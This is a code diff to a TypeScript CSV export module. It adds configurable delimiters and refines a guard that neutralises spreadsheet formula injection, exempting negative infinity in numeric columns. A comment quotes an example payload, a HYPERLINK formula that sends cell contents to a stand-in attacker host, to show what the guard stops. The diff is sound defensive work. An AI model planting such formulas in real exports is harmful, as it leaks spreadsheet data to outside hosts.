@@ -12,7 +12,7 @@
  * it is data the database held. The difference is only which grammar has to be
  * respected — RFC 4180 here, the engine's literal grammar there.
  *
- * Fields are separated by `,` and records by a single `\n`. RFC 4180 spells the
+ * Fields default to `,`, with `;` and tab also available; records use a single `\n`. RFC 4180 spells the
  * record separator `CRLF`; every reader that matters accepts a bare LF, and a field
  * that CONTAINS either is quoted, which is the part a reader cannot recover from.
  *
@@ -27,10 +27,12 @@ import { asBytes, binaryText } from "./binary";
 import { jsonText } from "./json";
 
 /**
- * The characters RFC 4180 says force a field to be quoted. A field is left bare
- * otherwise, so a numeric column stays numeric to a spreadsheet.
+ * Quotes and line breaks always require quoting. The delimiter is checked
+ * separately because it is now a parameter rather than part of this pattern.
  */
-const NEEDS_QUOTING = /["\r\n,]/;
+const NEEDS_QUOTING = /["\r\n]/;
+
+export type CsvDelimiter = "," | ";" | "\t";
 
 /**
  * A value as its CSV text, before quoting.
@@ -38,8 +40,11 @@ const NEEDS_QUOTING = /["\r\n,]/;
  * Absent is empty, which is how a reader spells NULL. It used to be the literal
  * text `null`/`undefined`, which reads back as a four- or nine-character string
  * and is indistinguishable from a column that genuinely holds that word.
+ *
+ * Exported for `/api/db/profile`, which writes a column's MIN, MAX and sample values
+ * as text and has to spell a date, a binary value or a bigint the way the file does.
  */
-function renderValue(value: unknown): string {
+export function renderValue(value: unknown): string {
   if (value === null || value === undefined) return "";
   if (value instanceof Date) return value.toISOString();
   // Before the object branch, and through the same module the grid renders with:
@@ -76,7 +81,31 @@ const FORMULA_LEAD = /^[=+\-@\t\r]/;
  */
 const PLAIN_NUMBER = /^[+-]?(\d+(\.\d*)?|\.\d+)([eE][+-]?\d+)?$/;
 
-function csvField(value: unknown): string {
+/**
+ * Whether a spreadsheet would read `text` as a formula: a `FORMULA_LEAD` that is not a plain
+ * number. Shared with the grid's clipboard (`src/components/results-grid/clipboard.ts`), whose
+ * range copy is pasted into the same spreadsheets and is guarded the same way.
+ */
+export function readsAsFormula(text: string): boolean {
+  return FORMULA_LEAD.test(text) && !PLAIN_NUMBER.test(text);
+}
+
+/**
+ * Whether `value` is a number the formula guard must let through although its text is not a
+ * `PLAIN_NUMBER`: negative infinity, the one non-finite word that opens with a formula lead.
+ *
+ * Exempt when the cell IS a number (a JavaScript `-Infinity`) or when the column was declared
+ * numeric and the cell carries the word, which is how a float crosses JSON (`non-finite.ts`).
+ * A text column holding the same word keeps the apostrophe: there the word is text like any
+ * other, and the guard is unconditional for text. The word itself carries no operator, call
+ * or cell reference, so letting it through a numeric column opens nothing.
+ */
+function isNegativeInfinity(value: unknown, numericColumn: boolean): boolean {
+  if (typeof value === "number") return value === Number.NEGATIVE_INFINITY;
+  return numericColumn && value === "-Infinity";
+}
+
+function csvField(value: unknown, delimiter: CsvDelimiter, numericColumn = false): string {
   const text = renderValue(value);
   // The one mutation in this file. `=HYPERLINK("http://attacker/"&A1)` is data in the
   // database and a formula in Excel, LibreOffice and Google Sheets, and it runs when
@@ -84,15 +113,22 @@ function csvField(value: unknown): string {
   // 24.2: `=1+1` imports as a live formula, and with the apostrophe it imports as the
   // string `'=1+1`. The apostrophe stays visible in the cell; that cost is paid on
   // every value a spreadsheet would evaluate, and on no other.
-  if (FORMULA_LEAD.test(text) && !PLAIN_NUMBER.test(text)) {
+  if (readsAsFormula(text) && !isNegativeInfinity(value, numericColumn)) {
     return `"'${text.replace(/"/g, '""')}"`;
   }
-  return NEEDS_QUOTING.test(text) ? `"${text.replace(/"/g, '""')}"` : text;
+  return NEEDS_QUOTING.test(text) || text.includes(delimiter) ? `"${text.replace(/"/g, '""')}"` : text;
 }
 
-/** One CSV record, escaped field by field. */
-export function csvRow(values: readonly unknown[]): string {
-  return values.map(csvField).join(",");
+/**
+ * One CSV record, escaped field by field. `numericColumns[i]` says the i-th value sits in a
+ * column declared numeric, which only changes how `-Infinity` is written (`isNegativeInfinity`).
+ */
+export function csvRow(
+  values: readonly unknown[],
+  delimiter: CsvDelimiter = ",",
+  numericColumns?: readonly boolean[],
+): string {
+  return values.map((value, index) => csvField(value, delimiter, numericColumns?.[index] === true)).join(delimiter);
 }
 
 /**
@@ -143,12 +179,27 @@ export function cellOf(row: Record<string, unknown>, column: string): unknown {
  * the engine declared for this result, and they fix both the order and the set. Each
  * row is then read BY NAME, so a row whose keys arrive in another order, or which is
  * missing one, lands in the right columns instead of shifting the rest.
+ *
+ * `numericColumns` names the columns the engine declared numeric, so a `-Infinity` that
+ * crossed JSON as text is written as the number it is there and not neutralised as text.
  */
-export function toCsv(rows: readonly Record<string, unknown>[], columns?: readonly string[]): string {
+export function toCsv(
+  rows: readonly Record<string, unknown>[],
+  columns?: readonly string[],
+  delimiter: CsvDelimiter = ",",
+  numericColumns?: ReadonlySet<string>,
+): string {
   const header = resolveColumns(rows, columns);
-  const lines = [csvRow(header)];
+  const lines = [csvRow(header, delimiter)];
+  const numeric = numericColumns === undefined ? undefined : header.map((column) => numericColumns.has(column));
   for (const row of rows) {
-    lines.push(csvRow(header.map((column) => cellOf(row, column))));
+    lines.push(
+      csvRow(
+        header.map((column) => cellOf(row, column)),
+        delimiter,
+        numeric,
+      ),
+    );
   }
   return lines.join("\n");
 }
